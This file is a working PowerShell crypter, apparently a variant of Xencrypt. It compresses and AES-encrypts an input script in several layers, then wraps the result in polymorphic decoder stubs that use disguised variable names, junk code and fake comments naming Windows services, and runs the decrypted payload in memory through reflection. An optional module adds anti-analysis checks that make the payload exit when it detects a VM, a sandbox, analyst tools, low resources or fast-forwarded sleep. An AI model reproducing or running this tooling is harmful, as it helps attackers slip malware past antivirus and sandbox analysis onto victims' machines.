[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true)] [string] $InFile,
    [Parameter(Mandatory=$true)] [string] $OutFile,
    [Parameter()] [int] $Iterations = 3,
    [Parameter()] [switch] $IncludeSandboxChecks
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function New-CamoVar {
    $prefixes = @('sys', 'win', 'app', 'cfg', 'tmp', 'log', 'net', 'sec', 'usr', 'env')
    $suffixes = @('Data', 'Info', 'Buffer', 'Stream', 'Handle', 'Context', 'Manager', 'Service')
    $chars = "abcdefghijklmnopqrstuvwxyz"
    $mid = -join (0..(Get-Random -Minimum 3 -Maximum 6) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return ($prefixes | Get-Random) + $mid + ($suffixes | Get-Random)
}

function New-JunkCode {
    $junk = @()
    # Realistic-looking Windows operations
    $junk += "`$null = [Environment]::ProcessorCount -band $((Get-Random -Maximum 32))"
    $junk += "[void][Math]::Round([Math]::PI * $((Get-Random -Minimum 1 -Maximum 100)), 2)"
    $junk += "`$$((New-CamoVar)) = `$env:COMPUTERNAME.Length -bxor $((Get-Random -Maximum 64))"
    $junk += "`$null = [DateTime]::Now.Ticks -band $((Get-Random -Maximum 65535))"
    $junk += "[void]([guid]::NewGuid().ToString().Length)"
    return $junk | Get-Random -Count 2
}

function New-RandomComment {
    $topics = @('Windows Update Service', 'System Telemetry', 'Performance Collector', 'Security Validator', 'Certificate Manager', 'Registry Sync', 'Event Log Handler')
    $verbs = @('Initializing', 'Starting', 'Processing', 'Configuring', 'Loading', 'Validating')
    return "# $($verbs | Get-Random) $($topics | Get-Random)"
}

function ConvertTo-CustomEncoding {
    param([byte[]]$Bytes)
    # Use hex encoding with random case and separator variations
    $separators = @('', '-', '.')
    $sep = $separators | Get-Random
    $result = @()
    foreach ($b in $Bytes) {
        $hex = '{0:X2}' -f $b
        if ((Get-Random -Maximum 2) -eq 1) { $hex = $hex.ToLower() }
        $result += $hex
    }
    return $result -join $sep
}

function New-SandboxChecks {
    $varMap = @{
        proceed = New-CamoVar
        vmCheck = New-CamoVar
        procCount = New-CamoVar
        memCheck = New-CamoVar
        diskCheck = New-CamoVar
        userCheck = New-CamoVar
        domainCheck = New-CamoVar
        sleepCheck = New-CamoVar
        startTime = New-CamoVar
        elapsed = New-CamoVar
    }
    
    $checks = @()
    $checks += New-RandomComment
    $checks += "`$$($varMap.proceed) = `$true"
    $checks += ""
    
    # Check 1: Processor count (sandboxes often have 1-2 CPUs)
    $checks += "# Validate system resources"
    $checks += "`$$($varMap.procCount) = [Environment]::ProcessorCount"
    $checks += "if (`$$($varMap.procCount) -lt 2) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 2: Memory check (sandboxes often have low RAM)
    $checks += "`$$($varMap.memCheck) = (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory"
    $checks += "if (`$$($varMap.memCheck) -and `$$($varMap.memCheck) -lt 2GB) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 3: Disk size check
    $checks += "`$$($varMap.diskCheck) = (Get-CimInstance Win32_LogicalDisk -Filter `"DeviceID='C:'`" -ErrorAction SilentlyContinue).Size"
    $checks += "if (`$$($varMap.diskCheck) -and `$$($varMap.diskCheck) -lt 50GB) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 4: VM detection via known VM artifacts
    $checks += "# Check for virtual environment indicators"
    $checks += "`$$($varMap.vmCheck) = @("
    $checks += "    (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Manufacturer -match 'VMware|VirtualBox|QEMU|Xen|Microsoft Corporation',"
    $checks += "    (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).SerialNumber -match 'VMware|VBOX',"
    $checks += "    (Get-Process -ErrorAction SilentlyContinue | Where-Object { `$_.Name -match 'vmware|vbox|sandboxie|wireshark|fiddler|procmon|procexp' }).Count -gt 0"
    $checks += ") -contains `$true"
    $checks += "if (`$$($varMap.vmCheck)) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 5: User interaction check (check for recent user activity)
    $checks += "# Verify user activity"
    $checks += "`$$($varMap.userCheck) = (Get-ChildItem `$env:TEMP -ErrorAction SilentlyContinue | Measure-Object).Count"
    $checks += "if (`$$($varMap.userCheck) -lt 5) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 6: Sleep timing check (sandboxes often fast-forward sleep)
    $checks += "# Timing validation"
    $checks += "`$$($varMap.startTime) = [DateTime]::Now"
    $checks += "Start-Sleep -Milliseconds 1500"
    $checks += "`$$($varMap.elapsed) = ([DateTime]::Now - `$$($varMap.startTime)).TotalMilliseconds"
    $checks += "if (`$$($varMap.elapsed) -lt 1400) { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    # Check 7: Domain check - skip if in common sandbox domains
    $checks += "`$$($varMap.domainCheck) = `$env:USERDOMAIN"
    $checks += "if (`$$($varMap.domainCheck) -match 'SANDBOX|VIRUS|MALWARE|CUCKOO|ANALYSIS|SAMPLE') { `$$($varMap.proceed) = `$false }"
    $checks += ""
    
    $checks += "if (-not `$$($varMap.proceed)) { exit }"
    $checks += ""
    
    return $checks
}

function New-ReflectionExecution {
    param([string]$BufferVar)
    
    # Generate unique variable names for each method
    $sbType = New-CamoVar
    $sbMethod = New-CamoVar
    $sbInstance = New-CamoVar
    $runnerCode = New-CamoVar
    $scriptVar = New-CamoVar
    $invoker = New-CamoVar
    
    # Pick a random method (1-3)
    $methodChoice = Get-Random -Minimum 1 -Maximum 4
    
    switch ($methodChoice) {
        1 {
            # Method 1: Reflection-based ScriptBlock creation using direct type access
            return @(
                "`$$sbType = [ScriptBlock]",
                "`$$sbMethod = `$$sbType.GetMethod('Create', [Type[]]@([string]))",
                "`$$sbInstance = `$$sbMethod.Invoke(`$null, @([Text.Encoding]::UTF8.GetString($BufferVar.ToArray())))",
                "`$$sbInstance.Invoke()"
            )
        }
        2 {
            # Method 2: PowerShell API
            return @(
                "`$$runnerCode = [Text.Encoding]::UTF8.GetString($BufferVar.ToArray())",
                "[void][PowerShell]::Create().AddScript(`$$runnerCode).Invoke()"
            )
        }
        3 {
            # Method 3: Dot-sourced ScriptBlock
            return @(
                "`$$scriptVar = [Text.Encoding]::UTF8.GetString($BufferVar.ToArray())",
                "`$$invoker = [ScriptBlock]::Create(`$$scriptVar)",
                ". `$$invoker"
            )
        }
    }
}

function Invoke-Xencrypt {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory)] [string] $InFile,
        [Parameter(Mandatory)] [string] $OutFile,
        [Parameter()] [int] $Iterations = 3,
        [Parameter()] [switch] $IncludeSandboxChecks
    )
    Process {

        $code = [System.IO.File]::ReadAllText($InFile)
        $rand = New-Object System.Random

        for ($i = 0; $i -lt $Iterations; $i++) {
            # Generate random crypto parameters
            $cipherParams = @{
                KeySize = @(128, 192, 256) | Get-Random
                Padding = @('PKCS7', 'ISO10126', 'ANSIX923') | Get-Random
                CipherMode = 'CBC'  # Stick with CBC for reliability
                CompressType = @('Deflate', 'Gzip') | Get-Random
                EncodingType = @('Hex', 'HexDash', 'HexDot', 'Custom') | Get-Random
            }

            # Compress payload
            $memStream = New-Object System.IO.MemoryStream
            if ($cipherParams.CompressType -eq 'Gzip') {
                $compStream = New-Object System.IO.Compression.GzipStream $memStream, ([IO.Compression.CompressionMode]::Compress)
            } else {
                $compStream = New-Object System.IO.Compression.DeflateStream $memStream, ([IO.Compression.CompressionMode]::Compress)
            }
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($code)
            $compStream.Write($bytes, 0, $bytes.Length)
            $compStream.Close()
            $compressed = $memStream.ToArray()
            $memStream.Dispose()

            # Encrypt payload
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = $cipherParams.KeySize
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::($cipherParams.Padding)
            $aes.GenerateIV()
            $aes.GenerateKey()
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($compressed, 0, $compressed.Length)
            
            # Prepend IV
            $fullPayload = $aes.IV + $encrypted
            
            # Use alternative encoding instead of Base64
            switch ($cipherParams.EncodingType) {
                'Hex' { 
                    $encodedPayload = ($fullPayload | ForEach-Object { '{0:X2}' -f $_ }) -join ''
                    $encodedKey = ($aes.Key | ForEach-Object { '{0:X2}' -f $_ }) -join ''
                    $decodeFunc = "[byte[]](`$str -split '(?<=\G.{2})' | Where-Object { `$_ } | ForEach-Object { [Convert]::ToByte(`$_, 16) })"
                }
                'HexDash' {
                    $encodedPayload = ($fullPayload | ForEach-Object { '{0:X2}' -f $_ }) -join '-'
                    $encodedKey = ($aes.Key | ForEach-Object { '{0:X2}' -f $_ }) -join '-'
                    $decodeFunc = "[byte[]](`$str -split '-' | ForEach-Object { [Convert]::ToByte(`$_, 16) })"
                }
                'HexDot' {
                    $encodedPayload = ($fullPayload | ForEach-Object { '{0:x2}' -f $_ }) -join '.'
                    $encodedKey = ($aes.Key | ForEach-Object { '{0:x2}' -f $_ }) -join '.'
                    $decodeFunc = "[byte[]](`$str -split '\.' | ForEach-Object { [Convert]::ToByte(`$_, 16) })"
                }
                'Custom' {
                    # Custom encoding: each byte as 3-digit decimal
                    $encodedPayload = ($fullPayload | ForEach-Object { '{0:D3}' -f $_ }) -join ''
                    $encodedKey = ($aes.Key | ForEach-Object { '{0:D3}' -f $_ }) -join ''
                    $decodeFunc = "[byte[]](`$str -split '(?<=\G.{3})' | Where-Object { `$_ } | ForEach-Object { [byte]`$_ })"
                }
            }
            
            $aes.Dispose()

            # Build polymorphic decoder stub
            $varMap = @{
                data = New-CamoVar
                key = New-CamoVar
                aesObj = New-CamoVar
                mem1 = New-CamoVar
                mem2 = New-CamoVar
                decStream = New-CamoVar
                decompress = New-CamoVar
                ivBytes = New-CamoVar
                decodeHelper = New-CamoVar
                codeBuffer = New-CamoVar
                aesType = New-CamoVar
                createMethod = New-CamoVar
            }

            $decoder = @()
            $decoder += New-RandomComment
            $decoder += ""
            
            # Add sandbox checks on last iteration only (outermost layer)
            if ($i -eq ($Iterations - 1) -and $IncludeSandboxChecks) {
                $decoder += New-SandboxChecks
            }
            
            $decoder += New-JunkCode
            $decoder += ""
            
            # Define the decode helper function
            $decoder += "function $($varMap.decodeHelper) { param(`$str); $decodeFunc }"
            $decoder += ""
            
            # Split encoded strings into chunks (variable size chunks)
            $chunkSize = Get-Random -Minimum 80 -Maximum 150
            $payloadChunks = @()
            for ($j = 0; $j -lt $encodedPayload.Length; $j += $chunkSize) {
                $end = [Math]::Min($j + $chunkSize, $encodedPayload.Length)
                $payloadChunks += $encodedPayload.Substring($j, $end - $j)
            }
            
            $decoder += New-RandomComment
            $decoder += "`$$($varMap.data) = @("
            $decoder += $payloadChunks | ForEach-Object { "    '$_'" }
            $decoder += ") -join ''"
            $decoder += ""
            
            $decoder += New-JunkCode
            $decoder += ""
            
            # Key in chunks
            $keyChunkSize = Get-Random -Minimum 16 -Maximum 32
            $keyChunks = @()
            for ($j = 0; $j -lt $encodedKey.Length; $j += $keyChunkSize) {
                $end = [Math]::Min($j + $keyChunkSize, $encodedKey.Length)
                $keyChunks += $encodedKey.Substring($j, $end - $j)
            }
            
            $decoder += "`$$($varMap.key) = @("
            $decoder += $keyChunks | ForEach-Object { "    '$_'" }
            $decoder += ") -join ''"
            $decoder += ""
            
            $decoder += New-RandomComment
            $decoder += ""
            
            # Use reflection to get AES type (avoid direct string)
            $aesTypeChars = @(65, 101, 115)  # A, e, s
            $decoder += "`$$($varMap.aesType) = [char[]]@($($aesTypeChars -join ',')) -join ''"
            $decoder += "`$$($varMap.createMethod) = [Security.Cryptography.SymmetricAlgorithm].Assembly.GetTypes() | Where-Object { `$_.Name -eq `$$($varMap.aesType) } | Select-Object -First 1"
            $decoder += "`$$($varMap.aesObj) = `$$($varMap.createMethod)::Create()"
            $decoder += ""
            
            # Set crypto parameters with randomized order
            $cryptoSteps = @(
                "`$$($varMap.aesObj).Key = $($varMap.decodeHelper) `$$($varMap.key)",
                "`$$($varMap.aesObj).Mode = [Security.Cryptography.CipherMode]::CBC",
                "`$$($varMap.aesObj).Padding = [Security.Cryptography.PaddingMode]::$($cipherParams.Padding)"
            ) | Sort-Object { Get-Random }
            
            $decoder += $cryptoSteps
            $decoder += ""
            
            # Extract IV and set it
            $decoder += "`$$($varMap.ivBytes) = ($($varMap.decodeHelper) `$$($varMap.data))[0..15]"
            $decoder += "`$$($varMap.aesObj).IV = `$$($varMap.ivBytes)"
            $decoder += ""
            
            $decoder += New-JunkCode
            $decoder += ""
            
            $decoder += "`$$($varMap.mem1) = New-Object IO.MemoryStream(, ($($varMap.decodeHelper) `$$($varMap.data)))"
            $decoder += "`$$($varMap.decStream) = `$$($varMap.aesObj).CreateDecryptor().TransformFinalBlock(`$$($varMap.mem1).ToArray(), 16, (`$$($varMap.mem1).Length - 16))"
            $decoder += ""
            
            $decoder += "`$$($varMap.mem2) = New-Object IO.MemoryStream(, `$$($varMap.decStream))"
            
            if ($cipherParams.CompressType -eq 'Gzip') {
                $decoder += "`$$($varMap.decompress) = New-Object IO.Compression.GzipStream `$$($varMap.mem2), ([IO.Compression.CompressionMode]::Decompress)"
            } else {
                $decoder += "`$$($varMap.decompress) = New-Object IO.Compression.DeflateStream `$$($varMap.mem2), ([IO.Compression.CompressionMode]::Decompress)"
            }
            $decoder += ""
            
            $decoder += New-RandomComment
            $decoder += "`$$($varMap.codeBuffer) = New-Object System.IO.MemoryStream"
            $decoder += "`$$($varMap.decompress).CopyTo(`$$($varMap.codeBuffer))"
            $decoder += "`$$($varMap.decompress).Dispose()"
            $decoder += "`$$($varMap.mem1).Dispose()"
            $decoder += "`$$($varMap.mem2).Dispose()"
            $decoder += "`$$($varMap.aesObj).Dispose()"
            $decoder += ""
            
            # Use reflection-based execution
            $execLines = New-ReflectionExecution -BufferVar "`$$($varMap.codeBuffer)"
            foreach ($execLine in $execLines) {
                $decoder += $execLine
            }
            $decoder += ""
            
            $decoder += New-JunkCode
            
            $code = $decoder -join "`r`n"
        }
        
        [System.IO.File]::WriteAllText($OutFile, $code)
        Write-Output "[+] Obfuscated payload written to $OutFile"
        Write-Output "[+] Iterations: $Iterations"
        Write-Output "[+] Sandbox checks: $($IncludeSandboxChecks.IsPresent -or $IncludeSandboxChecks)"
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    try {
        $params = @{
            InFile = $InFile
            OutFile = $OutFile
            Iterations = $Iterations
        }
        if ($IncludeSandboxChecks) {
            $params['IncludeSandboxChecks'] = $true
        }
        Invoke-Xencrypt @params
    }
    catch {
        Write-Error "Failed to execute: $_"
        exit 1
    }
}  